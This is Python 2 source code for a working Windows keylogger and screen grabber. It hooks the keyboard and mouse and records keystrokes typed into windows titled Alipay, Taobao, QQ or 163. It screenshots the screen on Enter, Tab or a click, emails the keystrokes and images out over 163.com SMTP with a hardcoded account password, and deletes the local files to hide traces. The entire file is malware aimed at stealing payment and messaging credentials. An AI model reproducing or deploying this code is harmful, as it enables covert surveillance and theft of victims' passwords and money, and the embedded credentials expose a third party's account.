# -*- coding: utf-8 -*- #

import os
import time
import pythoncom
import smtplib
import pyHook
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


sender = '15900892307@163.com'
receiver = '15900892307@163.com'
username = '15900892307@163.com'
password = 'TJ1995TJ'
smtp = smtplib.SMTP()
smtp = smtplib.SMTP()

# 如果是远程监听某个电脑，可以将获取到的信息通过邮件发出去
def send_email(msg, file_name):
    msgRoot = MIMEMultipart('related')
    msgRoot['Subject'] = file_name  # 邮件标题
    msgText = MIMEText('%s' % msg, 'html', 'utf-8')  # 发送HTML形式的文字信息
    msgRoot.attach(msgText)

    att = MIMEText(open('%s' % file_name, 'rb').read(), 'base64', 'utf-8')  # 将屏幕截图作为附件
    att["Content-Type"] = 'application/octet-stream'
    att["Content-Disposition"] = 'attachment; filename="%s"' % file_name
    msgRoot.attach(att)
    while 1:
        try:
            smtp.sendmail(sender, receiver, msgRoot.as_string())
            break
        except:
            try:
                smtp.connect('smtp.163.com')  # 尝试登陆SMTP邮件服务器
                smtp.login(username, password)
            except:
                print "failed to login to smtp server"
    path = os.getcwd() + "\\" + file_name  # 删除本地截图
    if os.path.exists(path):
        os.remove(path)


def onMouseEvent(event):
    # 监听鼠标事件
    global MSG
    if len(MSG) != 0:
        pic_name = time.strftime('%Y%m%d_%H%M%S', time.localtime(time.time()))
        pic_name = "mouse_" + pic_name + ".png"
        pic = ImageGrab.grab()
        pic.save('%s' % pic_name)  # 将用户屏幕截图，保存到本地
        send_email(MSG, pic_name)
        MSG = ''
    return True


def onKeyboardEvent(event):
    # 监听键盘事件
    global MSG
    title = event.WindowName.decode('GBK')
    # 通过窗口的title，判断当前窗口是否是“监听目标”
    if title.find(u"支付宝") != -1 or title.find(u"淘宝") != -1 or title.find(u'QQ') != -1 or title.find(u'Tongji') != -1 or title.find(u'163') != -1:
        # Ascii:  8-Backspace , 9-Tab ,13-Enter
        if (127 >= event.Ascii > 31) or (event.Ascii == 8):
            MSG += chr(event.Ascii)
        if (event.Ascii == 9) or (event.Ascii == 13):
            # 屏幕抓图实现
            pic_name = time.strftime('%Y%m%d_%H%M%S', time.localtime(time.time()))
            pic_name = "keyboard_" + pic_name + ".png"
            pic = ImageGrab.grab()  # 保存成为以日期命名的图片
            pic.save('%s' % pic_name)
            send_email(MSG, pic_name)
            MSG = ''
    return True


def main():
    # 创建hook句柄
    hm = pyHook.HookManager()
    # 监控鼠标
    hm.SubscribeMouseLeftDown(onMouseEvent)
    hm.HookMouse()
    # 监控键盘
    hm.KeyDown = onKeyboardEvent
    hm.HookKeyboard()
    # 循环获取消息
    pythoncom.PumpMessages()


if __name__ == "__main__":
    try:
        smtp.connect('smtp.163.com')  # 尝试登陆SMTP邮件服
        smtp.login(username, password)
    except:
        print "failed to login to smtp server"
    MSG = ''
    main()
